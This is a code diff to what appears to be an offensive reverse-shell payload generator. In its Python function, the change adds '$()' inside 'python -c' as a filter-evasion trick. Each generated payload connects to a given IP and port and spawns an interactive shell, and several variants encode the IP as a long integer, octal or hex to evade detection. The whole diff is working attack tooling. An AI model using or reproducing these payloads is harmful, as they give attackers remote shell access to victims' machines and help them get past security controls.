@@ -85,7 +85,7 @@ def ReverseShellPhp(ip, port,encode):
         print(rsph2)
 
 def ReverseShellPython(ip, port,encode):
-    rspy = ''.join(("\npy$()thon -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+ip+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
+    rspy = ''.join(("\npy$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+ip+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
     message_bytes = rspy.encode('ascii')
     if encode == 'd':
         print(rspy)
@@ -98,15 +98,15 @@ def ReverseShellPython(ip, port,encode):
         print('\n'+urlencode)
     elif encode == 'long':
         ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
-        rspy2 = ''.join(("\npy$()thon -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+str(ip2)+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
+        rspy2 = ''.join(("\npy$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+str(ip2)+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
         print(rspy2)
     elif encode == 'octa':
         ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
-        rspy2 = ''.join(("\npy$()thon -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+str(ip2)+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
+        rspy2 = ''.join(("\npy$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+str(ip2)+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
         print(rspy2)
     elif encode == 'hex':
         ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
-        rspy2 = ''.join(("\npy$()thon -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+str(ip2)+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
+        rspy2 = ''.join(("\npy$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+str(ip2)+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
         print(rspy2)
 
 def ReverseShellPerl(ip, port,encode):
